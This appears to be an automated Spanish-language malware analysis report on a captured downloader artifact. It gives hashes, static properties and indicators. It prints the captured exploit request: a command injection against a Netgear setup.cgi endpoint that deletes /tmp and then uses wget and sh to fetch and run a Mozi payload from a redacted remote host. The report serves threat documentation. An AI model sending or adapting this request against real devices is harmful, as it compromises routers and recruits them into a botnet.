# 🧬 Payload Analysis

`edaffc63f29b42ae9ff2213fab36fb1c98436552031b0c76c012c085a0b7ce55`

## 📌 Resumen

Artefacto identificado como ASCII text, with CRLF line terminators de 173 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `netgear` en `hxxp://[internal-ip-redacted]:8088/Mozi.m+-O+/tmp/netgear`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:44:36.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `edaffc63f29b42ae9ff2213fab36fb1c98436552031b0c76c012c085a0b7ce55`
- **SHA1:** `035dfc08393318dae62083cdb68ddd87cadaf22a`
- **MD5:** `5b1b69d3ef783804e9514d3607ead1eb`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 173 B |
| Entropía | 5.11 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Limpieza**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=3

## 🖥️ Comandos observados / extraídos

```text
GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+hxxp://[internal-ip-redacted]:8088/Mozi.m+-O+/tmp/netgear;s
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://[internal-ip-redacted]:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 | strings |
| command | GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+hxxp://[internal-ip-redacted]:8088/Mozi.m+-O+/tmp/netgear;s | strings |
| hash | edaffc63f29b42ae9ff2213fab36fb1c98436552031b0c76c012c085a0b7ce55 | static_analysis |
| ip | 103.213.112.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | structured text |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
